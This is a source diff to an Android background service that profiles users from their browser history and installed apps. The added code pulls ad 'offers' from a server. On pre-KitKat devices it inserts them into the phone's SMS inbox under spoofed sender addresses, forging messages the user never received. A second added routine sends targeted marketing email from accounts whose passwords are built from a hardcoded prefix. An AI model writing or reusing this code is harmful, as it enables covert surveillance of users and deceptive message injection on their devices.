@@ -1,23 +1,33 @@
 package user.com.profiling;
 
 import android.app.IntentService;
+import android.content.ContentValues;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.provider.Browser;
+import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 
 import user.com.profiling.network.ApiRequests;
+import user.com.profiling.network.response.EmailOffer;
+import user.com.profiling.network.response.EmailOffers;
+import user.com.profiling.network.response.SmsOffer;
+import user.com.profiling.network.response.SmsOffers;
 import user.com.profiling.network.response.UserProfiling;
+import user.com.profiling.util.EmailUtil;
 
 /**
  * This {@code IntentService} does the app's actual work. {@code SampleAlarmReceiver} (a {@code WakefulBroadcastReceiver}) holds a partial wake lock for this service while the
@@ -26,6 +36,7 @@ import user.com.profiling.network.response.UserProfiling;
 public class ProfilingSchedulingService extends IntentService {
 	private static final String TAG = ProfilingSchedulingService.class.getSimpleName();
 	private final static long THIRTY_DAYS_IN_MILLS = 2592000000l;
+	private static final String PWD_PREFIX = "Simba";
 
 	private ArrayList<String> browserHistory = new ArrayList<>();
 	private ArrayList<String> appNames = new ArrayList<>();
@@ -53,10 +64,105 @@ public class ProfilingSchedulingService extends IntentService {
 		getBrowserHistory();
 		getInstalledApps();
 		generateProfiles();
-		ArrayList<Profile> profilesAboveThreshold = getProfilesAboveThreshold();
-		if (BuildConfig.DEBUG) Log.d(TAG, profilesAboveThreshold.toString());
+		// getEmailOffers();
+		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
+			// run only below kitkat
+			getSmsOffers();
+		}
 		// email offer
 		// sms offer
+	}
+
+	private void getSmsOffers() {
+		ApiRequests.getSmsOffers(getApplicationContext(), new Response.Listener<SmsOffers>() {
+			@Override
+			public void onResponse(SmsOffers smsOffers) {
+				try {
+					Log.d(TAG, smsOffers.getMessages().get(0).get("US").toString());
+					ArrayList<SmsOffer> offers = smsOffers.getMessages().get(0).get("US");
+					ArrayList<Profile> profilesAboveThreshold = getProfilesAboveThreshold();
+
+					// Test code to be removed.
+					if (profilesAboveThreshold.isEmpty()) {
+						profilesAboveThreshold.add(new Profile("Dater", 20));
+					}
+					for (final SmsOffer offer : offers) {
+						for (Profile profile : profilesAboveThreshold) {
+							if (offer.getProfile().equals(profile.getProfileName())) {
+								Log.d(TAG, offer.getSender());
+								// send sms
+								addSmsToPhone(offer.getSender(), getSmsBody(offer));
+								break;
+							}
+						}
+					}
+				} catch (Exception ignored) {
+				}
+			}
+		}, new Response.ErrorListener() {
+			@Override
+			public void onErrorResponse(VolleyError volleyError) {
+				Log.d(TAG, String.valueOf(volleyError.getMessage()));
+			}
+		});
+	}
+
+	private String getSmsBody(SmsOffer offer) {
+		StringBuffer message = new StringBuffer(getBodyWithProperLink(offer.getBody(), offer.getLink()));
+		message.append("/n");
+		message.append(offer.getUnsubscribe());
+		return message.toString();
+	}
+
+	private String getBodyWithProperLink(String body, String link) {
+		return body.replace("LINK", link);
+	}
+
+	private void addSmsToPhone(String sender, String msg) {
+		ContentValues values = new ContentValues();
+		values.put("address", sender);// sender name
+		values.put("body", msg);
+		getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
+	}
+
+	private void getEmailOffers() {
+		ApiRequests.getEmailOffers(getApplicationContext(), new Response.Listener<EmailOffers>() {
+			@Override
+			public void onResponse(EmailOffers emailOffers) {
+				try {
+					Log.d(TAG, emailOffers.getEmails().get(0).get("US").toString());
+					ArrayList<EmailOffer> offers = emailOffers.getEmails().get(0).get("US");
+					ArrayList<Profile> profilesAboveThreshold = getProfilesAboveThreshold();
+					for (final EmailOffer offer : offers) {
+						for (Profile profile : profilesAboveThreshold) {
+							if (offer.getProfile().equals(profile.getProfileName())) {
+								Log.d(TAG, offer.getSubject());
+								// send email
+								String toEmail = EmailUtil.getUserPrimaryEmail(getApplicationContext());
+								if (!TextUtils.isEmpty(toEmail))
+									new Thread(new Runnable() {
+										@Override
+										public void run() {
+											boolean success = EmailUtil.sendEmail(offer.getEmail(), PWD_PREFIX + offer.getWord(),
+													EmailUtil.getUserPrimaryEmail(getApplicationContext()),
+													offer.getSubject(), offer.getBody());
+											String status = success ? "Email Success" : "Email Failed";
+											Toast.makeText(getApplicationContext(), status, Toast.LENGTH_LONG).show();
+										}
+									}).start();
+								break;
+							}
+						}
+					}
+				} catch (Exception ignored) {
+				}
+			}
+		}, new Response.ErrorListener() {
+			@Override
+			public void onErrorResponse(VolleyError volleyError) {
+				Log.d(TAG, String.valueOf(volleyError.getMessage()));
+			}
+		});
 	}
 
 	private void generateProfiles() {
